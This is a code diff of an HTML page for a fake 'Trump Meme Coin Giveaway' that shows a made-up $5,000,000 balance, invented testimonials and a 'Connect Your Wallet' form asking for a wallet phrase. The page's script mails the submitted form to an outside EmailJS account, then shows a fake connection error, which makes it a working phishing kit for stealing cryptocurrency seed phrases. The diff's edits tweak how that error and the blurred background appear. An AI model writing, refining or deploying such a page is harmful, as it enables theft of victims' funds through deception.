@@ -1,52 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html lang="en"><head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>The Official Trump Meme Coin Giveaway</title>
   <style>
-    /* [Existing styles stay untouched] */
+    /* [Your original styles unchanged] */
     body, h1, h2, p, button, input, select, a, footer {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
       font-family: Arial, sans-serif;
     }
-
     body {
       background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
       color: #333;
       line-height: 1.6;
       overflow-x: hidden;
     }
-
     header {
       background: rgba(0, 86, 179, 0.8);
       color: #fff;
       text-align: center;
       padding: 20px 10px;
     }
-
     header img {
       max-width: 120px;
       margin-bottom: 10px;
     }
-
     header h1 {
       font-size: 2rem;
       margin-bottom: 5px;
     }
-
     header p {
       font-size: 1.2rem;
     }
-
     .balance {
       font-size: 1.5rem;
       font-weight: bold;
       margin-top: 10px;
     }
-
     .container {
       max-width: 900px;
       margin: 30px auto;
@@ -56,12 +47,10 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       transition: filter 0.3s ease;
     }
-
     .blurred {
       filter: blur(8px);
       pointer-events: none;
     }
-
     .wallet-page {
       display: none;
       background: #fff;
@@ -76,11 +65,9 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
       z-index: 1000;
     }
-
     .wallet-page.active {
       display: block;
     }
-
     .error {
       color: red;
       font-weight: bold;
@@ -92,7 +79,6 @@
       border-radius: 5px;
       margin-bottom: 10px;
     }
-
     #error-box {
       display: none;
       background: #ffe6e6;
@@ -104,10 +90,7 @@
       padding: 10px;
       border-radius: 6px;
       margin-top: 10px;
-      z-index: 10000;
-      position: relative;
     }
-
     #error-box button {
       margin-top: 8px;
       background: #ff4500;
@@ -118,17 +101,14 @@
       border-radius: 5px;
       cursor: pointer;
     }
-
     #error-box button:hover {
       background: #e03e00;
     }
-
     label {
       display: block;
       margin-top: 10px;
       font-weight: bold;
     }
-
     input, select, textarea {
       width: 100%;
       padding: 12px;
@@ -137,7 +117,6 @@
       border-radius: 5px;
       font-size: 1rem;
     }
-
     textarea {
       width: 100%;
       height: 60px;
@@ -149,7 +128,6 @@
       display: block;
       margin: 10px auto;
     }
-
     .btn {
       display: block;
       width: 100%;
@@ -164,11 +142,9 @@
       text-align: center;
       cursor: pointer;
     }
-
     .btn:hover {
       background: #e03e00;
     }
-
     footer {
       text-align: center;
       margin-top: 30px;
@@ -176,21 +152,17 @@
       background: #f1f1f1;
       color: #666;
     }
-
     .terms {
       font-size: 0.9rem;
       margin-top: 20px;
     }
-
     .terms a {
       color: #0056b3;
       text-decoration: none;
     }
-
     .terms a:hover {
       text-decoration: underline;
     }
-
     .note {
       margin-top: 20px;
       font-size: 0.75rem;
@@ -201,17 +173,14 @@
       border-radius: 5px;
       border: 1px solid #ffeeba;
     }
-
     #wallet-phrase::placeholder {
       text-align: center;
       font-size: 1rem;
       font-weight: bold;
     }
-
     body.noscroll {
       overflow: hidden;
     }
-
     #testimonials {
       background: #f9f9f9;
       padding: 20px;
@@ -220,33 +189,22 @@
       margin-top: 30px;
       text-align: center;
     }
-
     #testimonials h3 {
       margin-bottom: 10px;
     }
-
     #testimonial-text {
       font-style: italic;
       font-size: 1.1rem;
       transition: opacity 0.5s ease-in-out;
       min-height: 60px;
     }
-
-    /* NEW: Blur everything except error message */
-    .blur-everything *:not(#error-box):not(#error-box *) {
-      filter: blur(8px) !important;
-      pointer-events: none;
-    }
-  </style>
-</head>
-<body>
+  </style></head><body>
   <header>
     <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
     <h1>Trump Meme Coin Giveaway</h1>
     <p>Make America Great Again!</p>
     <div class="balance">$5,000,000 $TRUMP</div>
   </header>
-
   <div class="container" id="main-content">
     <div class="card">
       <h2>Join the Revolution!</h2>
@@ -261,7 +219,6 @@
       <div id="testimonial-text">Loading testimonials...</div>
     </div>
   </div>
-
   <div class="wallet-page" id="wallet-page">
     <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
     <h2>Connect Your Wallet</h2>
@@ -280,14 +237,12 @@
       <button class="btn" id="submit-btn" type="submit">Connect</button>
     </form>
   </div>
-
   <footer>
     <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
     <div class="terms">
       <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
     </div>
   </footer>
-
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function() {
@@ -310,7 +265,6 @@
       document.querySelector('footer').classList.remove('blurred');
       document.body.classList.remove('noscroll');
       document.getElementById("error-box").style.display = "none";
-      document.body.classList.remove('blur-everything'); // REMOVE BLUR
     }
 
     document.getElementById("wallet-form").addEventListener("submit", function(event) {
@@ -323,6 +277,11 @@
       emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
         .then(function(response) {
           setTimeout(() => {
+            // Ensure blurred classes stay applied
+            document.getElementById('main-content').classList.add('blurred');
+            document.querySelector('header').classList.add('blurred');
+            document.querySelector('footer').classList.add('blurred');
+
             errorBox.innerHTML = `
               Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
               <button onclick="returnToMainPage()">Try Again</button>
@@ -330,10 +289,14 @@
             errorBox.style.display = "block";
             btn.disabled = false;
             btn.textContent = "Connect";
-            document.body.classList.add('blur-everything'); // APPLY BLUR
           }, 2000);
         })
         .catch(function(error) {
+          // Ensure blurred classes stay applied
+          document.getElementById('main-content').classList.add('blurred');
+          document.querySelector('header').classList.add('blurred');
+          document.querySelector('footer').classList.add('blurred');
+
           errorBox.innerHTML = `
             Unexpected server issue. Please try again.<br>
             <button onclick="returnToMainPage()">Try Again</button>
@@ -341,7 +304,6 @@
           errorBox.style.display = "block";
           btn.disabled = false;
           btn.textContent = "Connect";
-          document.body.classList.add('blur-everything'); // APPLY BLUR
         });
     });
 
@@ -357,7 +319,6 @@
       "“Crazy how smooth it worked. Props to the devs.” – Tarek Y.",
       "“Only 2,000 left? Tell your friends now!” – Sheila M."
     ];
-
     let currentIndex = 0;
     function rotateTestimonial() {
       const testimonialDiv = document.getElementById('testimonial-text');
@@ -368,7 +329,6 @@
         currentIndex = (currentIndex + 1) % testimonials.length;
       }, 500);
     }
-
     setInterval(rotateTestimonial, 5000);
     window.addEventListener('load', rotateTestimonial);
   </script>
